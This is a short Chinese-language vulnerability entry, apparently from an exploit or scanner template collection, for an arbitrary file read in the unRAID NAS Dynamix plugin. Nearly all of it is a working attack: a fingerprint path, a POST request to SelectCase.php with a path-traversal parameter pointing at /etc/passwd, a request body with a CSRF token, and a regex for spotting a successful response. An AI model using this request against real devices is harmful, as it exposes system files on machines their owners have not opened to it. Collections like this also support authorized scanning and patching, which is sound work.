# NAS设备unraidDynamix插件任意文件读取漏洞

NAS ｜ 任意文件读取/写入 ｜ —
- **指纹**：`"/webGui/images/banner.png"`
- **请求**：`POST /plugins/dynamix/include/SelectCase.php?file=../../../../etc/passwd HTTP/1.1`

**Payload**
```
csrf_token=9855BE5478D13A31&mode=get
```
- **响应特征**：200 ^(?=.*?root)(?=.*?bin).*?$